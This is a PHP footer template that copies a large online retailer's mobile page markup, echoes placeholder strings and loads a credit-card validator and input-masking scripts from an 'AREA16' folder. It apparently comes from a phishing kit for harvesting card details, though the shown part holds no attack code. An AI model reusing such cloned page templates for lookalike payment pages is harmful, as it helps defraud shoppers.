<?php 
defined("ACCESS") or die('Konz');
?>
<footer class="nav-mobile nav-ftr-batmobile">
				<div id="nav-ftr" class="nav-t-footer-basicNoAuth nav-sprite-v3">
					<ul class="nav-ftr-horiz">
						<li class="nav-li">
							<a class="nav-a">
								<?php echo $_21 ?>
							</a>
						</li>
						<li class="nav-li">
							<a class="nav-a">
								<?php echo $_22 ?>
							</a>
						</li>
						<li class="nav-li">
							<a class="nav-a">
								<?php echo $_32 ?>
							</a>
						</li>
					</ul>
					<div id="nav-ftr-copyright">
						<?php echo $_24 ?>
					</div>
				</div>
			</footer>
		</div>
		<script src="<?=base_url()?>AREA16/assets/js/jquery-3.3.1.min.js"></script>
		<script src="<?=base_url()?>AREA16/assets/js/jquery.mask.min.js"></script>
		<script src="<?=base_url()?>AREA16/assets/js/jquery.validate.min.js"></script>
		<script src="<?=base_url()?>AREA16/assets/js/additional-methods.min.js"></script>
		<script src="<?=base_url()?>AREA16/assets/js/jquery.creditCardValidator.js"></script>